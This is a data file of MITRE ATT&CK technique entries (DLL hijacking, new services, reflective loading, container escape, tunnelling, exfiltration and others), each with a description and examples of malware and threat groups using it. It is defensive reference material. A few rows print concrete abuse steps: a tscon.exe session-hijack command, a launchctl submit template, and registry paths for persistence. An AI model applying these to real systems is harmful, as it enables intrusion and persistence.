T1038,DLL Search Order Hijacking,"Windows systems use a common method to look for required DLLs to load into a program.  Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence.   Adversaries may perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.  Adversaries may use this behavior to cause the program to load a malicious DLL.   Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation.     If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.  Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",[],True
T1050,New Service,"When operating systems boot up, they can start programs or applications called services that perform background system functions.  A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry.   Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading] Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution]","['[PoisonIvy] creates a Registry subkey that registers a new service.', '[APT32] creates a Windows service to establish persistence.', '[TYPEFRAME] variants can add malicious DLL modules as new services.', 'Some [Volgmer] variants install .dll files as services with names generated by a list of hard-coded strings.', '[PlugX] can be added as a service to establish persistence.', 'creates a Registry subkey that registers a new service.']",True
T1620,Reflective Code Loading,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules]  Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the `Assembly.Load()` method executed by [PowerShell] may be abused to load raw code into the running process.  Reflective code injection is very similar to [Process Injection] except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.","['[BADHATCH] can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to `CreateThread`.', '[WhisperGate] downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.', '[Uroburos] has the ability to load new modules directly into memory using its `Load Modules Mem` command.', '[PowerSploit] reflectively loads a Windows PE file into a process.', '[Lokibot] has reflectively loaded the decoded DLL into memory. ', '[Gelsemium] can use custom shellcode to map embedded DLLs into memory.', '[metaMain] has reflectively loaded a DLL to read, decrypt, and load an orchestrator file.', '[Lazarus Group] has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via [KernelCallbackTable] hijacking. [Lazarus Group] has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.', '[Cuba] loaded the payload into memory using PowerShell. ', '[Cobalt Strike] <code>execute-assembly</code> command can run a .NET executable within the memory of a sacrificial process by loading the CLR.', '[Brute Ratel C4] has used reflective loading to execute malicious DLLs.', '[IceApple] can use reflective code loading to load .NET assemblies into `MSExchangeOWAAppPool` on targeted Exchange servers.', '[Donut] can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.', '[Emotet] has reflectively loaded payloads into memory.', '[Sardonic] has a plugin system that can load specially made DLLs into memory and execute their functions.', '[ThiefQuest] uses various API functions such as <code>NSCreateObjectFileImageFromMemory</code> to load and link in-memory payloads.', '[FoggyWeb] loader has reflectively loaded .NET-based assembly/payloads into memory.']",False
T1611,Escape to Host,"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.  There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.  Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command] Adversaries may also escape via [Exploitation for Privilege Escalation] such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.  Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.","['[Peirates] can gain a reverse shell on a host node by mounting the Kubernetes hostPath.', '[Doki] container was configured to bind the host root directory.', '[Siloscape] maps the host’s C drive to the container by creating a global symbolic link to the host through the calling of <code>NtSetInformationSymbolicLink</code>.', '[TeamTNT] has deployed privileged containers that mount the filesystem of victim machine.', '[Hildegard] has used the BOtB tool that can break out of containers.  ']",False
T1010,Application Window Discovery,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery] to evade.  Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter] commands and [Native API] functions.","['[Attor] can obtain application window titles and then determines which windows to perform Screen Capture on.', '[NetTraveler] reports window names along with keylogger information to provide application context.', '[Cadelspy] has the ability to identify open windows on the compromised host.', '[Flagpro] can check the name of the window displayed on the system. ', '[njRAT] gathers information about opened windows during the initial infection.', '[Lazarus Group] malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.', '[Trojan.Karagany] can monitor the titles of open windows to identify specific keywords.\t ', ""[DarkGate] will search for cryptocurrency wallets by examining application window names for specific strings. [DarkGate] extracts information collected via NirSoft tools from the hosting process's memory by first identifying the window through the <code>FindWindow</code> API function."", '[DarkWatchman] reports window names along with keylogger information to provide application context.', '[PowerDuke] has a command to get text of the current foreground window.', '[InvisiMole] can enumerate windows and child windows on a compromised host.', '[Aria-body] has the ability to identify the titles of running windows on a compromised host.', '[Grandoreiro] can identify installed security tools based on window names.', '[WINERACK] can enumerate active windows.', '[Machete] saves the window names. ', '[NightClub] can use `GetForegroundWindow` to enumerate the active window.', '[NETWIRE] can discover and close windows on controlled systems.', '[Kazuar] gathers information about opened windows.', '[Remexi] has a command to capture active windows on the machine and retrieve window titles.', '[SOUNDBITE] is capable of enumerating application windows.', 'The discovery modules used with [Duqu] can collect information on open windows.', '[HotCroissant] has the ability to list the names of all open windows on the infected host.', '[Metamorfo] can enumerate all windows on the victim’s machine.', '[ROKRAT] can use  the `GetForegroundWindow` and `GetWindowText` APIs to discover where the user is typing.', '[SILENTTRINITY] can enumerate the active Window during keylogging through execution of `GetActiveWindowTitle`.', '[Catchamas] obtains application windows titles and then determines which windows to perform [Screen Capture] on.', '[QakBot] has the ability to enumerate windows on a compromised host. ', '[HEXANE] has used a PowerShell-based keylogging tool to capture the window title.', '[PLEAD] has the ability to list open windows on the compromised host.', '[PoisonIvy] captures window titles.', '[FunnyDream] has the ability to discover application windows via execution of `EnumWindows`.', 'captures window titles.']",False
T1032,Standard Cryptographic Protocol,"Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.","['[Remsec] network loader encrypts C2 traffic with RSA and RC6.', '[MobileOrder] uses AES to encrypt C2 communications.', '[Nidiran] uses RC4 to encrypt C2 traffic.', '[Taidoor] uses RC4 to encrypt the message body of HTTP content.', '[Machete] has relied on TLS-encrypted FTP to transfer data out of target environments. ', 'Some [Felismus] samples use AES to encrypt C2 traffic.', '[BRONZE BUTLER] has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.', 'APT34 used the Plink utility and other tools to create tunnels to C2 servers.']",True
T1062,Hypervisor,**This technique has been deprecated and should no longer be used.**  A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware.  It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen.  A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit] functionality to hide its existence from the guest operating system.  A malicious hypervisor of this nature could be used to persist on systems through interruption.,[],
T1182,AppCert DLLs,"Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec.   Similar to [Process Injection] this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",[],True
T1029,Scheduled Transfer,"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.  When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel] or [Exfiltration Over Alternative Protocol]","['[jRAT] can be configured to reconnect at certain intervals.', '[Flagpro] has the ability to wait for a specified time interval between communicating with and executing commands from C2.', '[Shark] can pause C2 communications for a specified time.', '[LightNeuron] can be configured to exfiltrate data during nighttime or working hours.', '[POWERSTATS] can sleep for a given number of seconds.', '[Dipsind] can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.', '[ComRAT] has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).', '[ADVSTORESHELL] collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.', '[Linfo] creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.', '[Ninja] can configure its agent to work only in specific time frames.', '[Cobalt Strike] can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.', '[ShimRat] can sleep when instructed to do so by the C2.\t', '[Machete] sends stolen data to the C2 server every 10 minutes. ', '[Higaisa] sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.', '[ShadowPad] has sent data back to C2 every 8 hours.', '[TinyTurla] contacts its C2 based on a scheduled timing set in its configuration.', '[Chrommme] can set itself to sleep before requesting a new command from C2.', '[Kazuar] can sleep for a specific time and be set to communicate at specific intervals.', '[Cobalt Strike] can set its ""beacon"" payload to reach out to the C2 server on an arbitrary and random interval. In addition it will break large data sets into smaller chunks for exfiltration.']",
T1525,Implant Internal Image,"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware] this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.  A tool has been developed to facilitate planting backdoors in cloud container images. If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell]",[],
T1572,Protocol Tunneling,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.   There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.   [Protocol Tunneling] may also be abused by adversaries during [Dynamic Resolution] Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.   Adversaries may also leverage [Protocol Tunneling] in conjunction with [Proxy] and/or [Protocol Impersonation] to further conceal C2 communications and infrastructure. ","['During [C0027] [Scattered Spider] used SSH tunneling in targeted environments.', '[FIN13] has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.', 'During the [C0032] campaign, [TEMP.Veles] used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.', '[Heyoka Backdoor] can use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers.', '[Magic Hound] has used Plink to tunnel RDP over SSH.', '[FIN6] used the Plink command-line utility to create SSH tunnels to C2 servers.', '[Duqu] uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.', '[FunnyDream] can connect to HTTP proxies via TCP to create a tunnel to C2.', '[Kevin] can use a custom protocol tunneled through DNS or HTTP.', '[Industroyer] attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] deployed the GOGETTER tunneler software to establish a “Yamux” TLS-based C2 channel with an external server(s).', '[Brute Ratel C4] can use DNS over HTTPS for C2.', '[Chimera] has encapsulated [Cobalt Strike] C2 protocol in DNS and HTTPS.', '[Milan] can use a custom protocol tunneled through DNS or HTTP.', 'During [Cutting Edge] threat actors used Iodine to tunnel IPv4 traffic over DNS.', '[Uroburos] has the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets, HTTP, SMTP, and DNS.', '[OilRig] has used the Plink utility and other tools to create tunnels to C2 servers.', '[Cobalt Strike] uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.', '[Fox Kitten] has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as [ngrok] and custom tool SSHMinion.', '[Cobalt Group] has used the Plink utility to create SSH tunnels.', '[Cinnamon Tempest] has used the Iox and NPS proxy and tunneling tools in combination  create multiple connections through a single tunnel.', '[ngrok] can tunnel RDP and other services securely over internet connections.', '[Mythic] can use SOCKS proxies to tunnel traffic through another protocol.', ""During [CostaRicto] the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain. "", '[FLIPSIDE] uses RDP to tunnel traffic from a victim environment.', 'The [QakBot] proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.', '[Cyclops Blink] can use DNS over HTTPS (DoH) to resolve C2 nodes.', '[Leviathan] has used protocol tunneling to further conceal C2 communications and infrastructure.', '[Ngrok] can tunnel RDP and other services securely over internet connections.', ""[CostaRicto] has set up remote SSH tunneling into the victim's environment from a malicious domain."", '[Cobalt Strike] uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.']",
T1004,Winlogon Helper DLL,"Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.    Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:   * Winlogon\Notify - points to notification package DLLs that handle Winlogon events * Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on * Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on  Adversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.",[],True
T1009,Binary Padding,"Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary. This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.  Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed. ",[],True
T1550,Use Alternate Authentication Material,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.   Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.  Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access] techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors. ","['During the [SolarWinds Compromise] [APT29] used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling [APT29] to access enterprise cloud applications and services.', ""[FoggyWeb] can allow abuse of a compromised AD FS server's SAML token."", '[APT29] used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling [APT29] to access enterprise cloud applications and services.', '[UNC2452] used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling [UNC2452] to access enterprise cloud applications and services.']",False
T1076,Remote Desktop Protocol,"Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).  There are other implementations and third-party tools that provide graphical access [Remote Services] similar to RDS.  Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features] technique for Persistence.   Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user.  This can be done remotely or locally and with active or disconnected sessions.  It can also lead to [Remote System Discovery] and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. ","['APT34 uses Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.', 'Dragonfly used RDP to connect to additional victims.']",True
T1011,Exfiltration Over Other Network Medium,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.  Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",[],False
T1589,Gather Victim Identity Information,"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about users could also be enumerated via other active means (i.e. [Active Scanning] such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames. Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites]  Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Phishing for Information] establishing operational resources (ex: [Compromise Accounts] and/or initial access (ex: [Phishing] or [Valid Accounts]","['[LAPSUS$] has gathered detailed information of target employees to enhance their social engineering lures.', '[HEXANE] has identified specific potential victims at targeted organizations.', '[FIN13] has researched employees to target for social engineering attacks.', 'For [Operation Dream Job] [Lazarus Group] conducted extensive reconnaissance research on potential targets.', '[APT32] has conducted targeted surveillance against activists and bloggers.', 'During [Operation Wocao] threat actors targeted people based on their organizational roles and privileges.', '[Magic Hound] has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.']",False
T1131,Authentication Package,"Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.   Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>""Authentication Packages""=<target binary></code>. The binary will then be executed by the system when the authentication packages are loaded.",['[Flame] can use Windows Authentication Packages for persistence.'],True
T1181,Extra Window Memory Injection,"Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).  Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.    Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.  Execution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection] this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.  More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  ",[],True
T1560,Archive Collected Data,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.  Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.","['[Dragonfly] has compressed data into .zip files prior to exfiltration.', '[Chrommme] can encrypt and store on disk collected data before exfiltration.', ""[Patchwork] encrypted the collected files' path with AES and then encoded them with base64."", '[Emotet] has been observed encrypting the data it collects before sending it to the C2 server. ', '[Exaramel for Windows] automatically encrypts files before sending them to the C2 server. ', '[TAINTEDSCRIBE] has used <code>FileReadZipSend</code> to compress a file and send to C2.', '[Axiom] has compressed and encrypted data prior to exfiltration.', '[LoFiSe] can collect files into password-protected ZIP-archives for exfiltration.', '[BloodHound] can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.', '[ADVSTORESHELL] encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.', '[Empire] can ZIP directories on the target system.', '[Bumblebee] can compress data stolen from the Registry and volume shadow copies prior to exfiltration.', '[WellMail] can archive files on the compromised host.', '[Lazarus Group] has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. ', '[Cadelspy] has the ability to compress stolen data into a .cab file.', '[LightNeuron] contains a function to encrypt and store emails that it collects.', '[APT28] used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.', '[VERMIN] encrypts the collected files using 3-DES.', '[ShimRatReporter] used LZ compression to compress initial reconnaissance reports before sending to the C2.\t', '[APT32] backdoor has used LZMA compression and RC4 encryption before exfiltration.', '[XCSSET] will compress entire <code>~/Desktop</code> folders excluding all <code>.git</code> folders, but only if the total data size is under 200MB.', '[Gold Dragon] encrypts data using Base64 before being sent to the command and control server.', '[KONNI] has encrypted data and files prior to exfiltration.', '[NETWIRE] has the ability to compress archived screenshots.', '[PowerLess] can encrypt browser database files prior to exfiltration.', '[Epic] encrypts collected data using a public key framework before sending it over the C2 channel. Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.', '[Kessel] can RC4-encrypt credentials before sending to the C2.\t', '[Zebrocy]  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration.  ', 'Following data collection, [FIN6] has compressed log files into a ZIP archive prior to staging and exfiltration.', '[Lurid] can compress data before sending it.', '[AppleSeed] has compressed collected data before exfiltration.', '[LuminousMoth] has manually archived stolen files from victim machines before exfiltration.', '[Backdoor.Oldrea] writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.', '[BLUELIGHT] can zip files before exfiltration.', '[FELIXROOT] encrypts collected data with AES and Base64 and then sends it to the C2 server.', 'The [Ke3chang] group has been known to compress data before exfiltration.', '[Remexi] encrypts and adds all gathered browser data into files for upload to C2.', '[RunningRAT] contains code to compress files.', '[Machete] stores zipped files with profile data from installed web browsers. ', '[Agent Tesla] can encrypt data with 3DES before sending it over to a C2 server.', '[Dtrack] packs collected data into a password protected archive.', '[menuPass] has encrypted files and information before exfiltration.', '[Daserf] hides collected data in password-protected .rar archives.', ""[Leviathan] has archived victim's data prior to exfiltration."", '[Proton] zips up files before exfiltrating them.', '[Pillowmint] has encrypted stolen credit card information with AES and further encoded it with Base64.\t', '[Aria-body] has used ZIP to compress data gathered on a compromised host.', 'After collecting documents from removable media, [Prikormka] compresses the collected files, and encrypts it with Blowfish.', '[Lizar] has encrypted data before sending it to the server.', '[Honeybee] adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.', '[Dragonfly 2.0] compressed data into .zip files prior to exfiltrating it.']",False
T1152,Launchctl,"Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  . Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute ""arg"" ""arg"" ""arg""</code>. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges.   Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.",[],True
T1483,Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.  DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.  Adversaries may use DGAs for the purpose of [Fallback Channels] When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",['[Ebury] has used a DGA to generate a domain name for C2.'],True
T1185,Browser Session Hijacking,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.  A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.  Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint] or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.","['[TrickBot] uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.', '[Dridex] can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.', '[Carberp] has captured credentials when a user performs login through a SSL session.', ""[Melcoz] can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background."", '[Agent Tesla] has the ability to use form-grabbing to extract data from web data forms.', '[Grandoreiro] can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.', '[QakBot] can use advanced web injects to steal web banking credentials.', ""[Cobalt Strike] can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates."", '[IcedID] has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  [IcedID] can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.', '[Chaes] has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.', '[Ursnif] has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).', ""[Cobalt Strike] can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.""]",
T1021,Remote Services,"Adversaries may use [Valid Accounts] to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.  In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain.   Legitimate applications (such as [Software Deployment Tools] and other administrative programs) may utilize [Remote Services] to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC] to send the screen and control buffers and [SSH] for secure file transfer. Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.","['[Wizard Spider] has used the WebDAV protocol to execute [Ryuk] payloads hosted on network file shares.', '[MacMa] can manage remote screen sessions.', '[Brute Ratel C4] has the ability to use RPC for lateral movement.', '[Kivars] has the ability to remotely trigger keyboard input and mouse clicks. ', '[Stuxnet] can propagate via peer-to-peer communication and updates using RPC.', 'RemoteCMD can execute commands remotely by creating a new service on the remote system .']",False
